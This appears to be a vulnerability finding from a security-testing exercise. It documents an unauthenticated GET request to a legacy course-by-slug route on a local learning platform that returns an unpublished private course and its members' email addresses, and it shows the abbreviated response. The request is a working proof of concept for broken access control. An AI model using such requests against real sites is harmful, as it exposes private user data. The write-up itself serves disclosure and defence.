### VULN-016 — Unauthenticated GET /course/slug/:slug leaks a private course + member emails
### Precondition (admin): an UNPUBLISHED, non-PUBLIC (SELF_PACED, status=ACTIVE) course with a slug and a member.
### The decisive request carries NO Cookie header — it is fully unauthenticated.

GET http://localhost:21527/course/slug/cvehunt-016-slug_cde57017 HTTP/1.1
Host: localhost:21527
Origin: http://localhost:21526

### Response: HTTP 200
### {
###   "success": true,
###   "data": {
###     "isPublished": false, "type": "SELF_PACED", "status": "ACTIVE",
###     "group": { "members": [
###         { "profile": { "email": "admin@cvehunt.local", ... } },
###         { "profile": { "email": "u_ce6534a6@cvehunt.local", ... } }   <-- member emails leaked
###     ] },
###     "content": { ... full private course structure ... }
###   }
### }
###
### The hardened public channel GET /org-site/course/:slug returns null unless
### type='PUBLIC' && isPublished && status='ACTIVE'; this legacy by-slug route enforces none of that.
